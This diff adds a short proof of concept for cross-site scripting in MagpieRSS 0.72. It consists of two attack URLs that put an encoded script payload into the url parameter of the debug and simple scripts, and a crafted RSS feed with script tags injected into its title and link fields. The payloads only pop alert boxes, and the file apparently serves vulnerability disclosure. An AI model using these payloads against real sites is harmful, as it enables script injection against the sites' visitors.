@@ -1,0 +1,27 @@
+
+http://www.example.com/magpierss-0.72/scripts/magpie_debug.php?url=%22%3E%3Cscript%3Ealert(%27xss%27);%3C/script
+http://www.example.com/magpierss-0.72/scripts/magpie_simple.php?url=%22%3E%3Cscript%3Ealert(%27xss%27);%3C/script
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;rss version=&quot;2.0&quot; xml:base=&quot;http://www.example.com&quot;
+xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;&gt;
+&lt;channel&gt;
+ &lt;title&gt;Justin.MadIrish.net &amp;lt;script&gt;alert(&#039;xss title&#039;);&amp;lt;/script&gt;-
+Justin&amp;#039;s Personal Homepage&lt;/title&gt;
+ &lt;link&gt;http://www.example.com&lt;/link&gt;
+ &lt;description&gt;Close personal friends with Evil Eve.&lt;/description&gt;
+ &lt;language&gt;en&lt;/language&gt;
+
+&lt;item&gt;
+ &lt;title&gt;Disturbing&amp;lt;script&gt;alert(&#039;xss title&#039;);&amp;lt;/script&gt;
+XSS&lt;script&gt;alert(&#039;xss title&#039;);&lt;/script&gt;&lt;/title&gt;
+ &lt;link&gt;http://www.example.com/node/343 &amp;lt;script&gt;alert(&#039;xss
+link&#039;);&amp;lt;/script&gt;&lt;/link&gt;
+ &lt;description&gt;foobar&lt;/description&gt;
+ &lt;pubDate&gt;Wed, 04 Mar 2009 13:42:09 +0000&lt;/pubDate&gt;
+ &lt;dc:creator&gt;justin&lt;/dc:creator&gt;
+ &lt;guid isPermaLink=&quot;false&quot;&gt;343 at http://www.example.com&lt;/guid&gt;
+
+&lt;/item&gt;
+&lt;/channel&gt;
+&lt;/rss&gt;
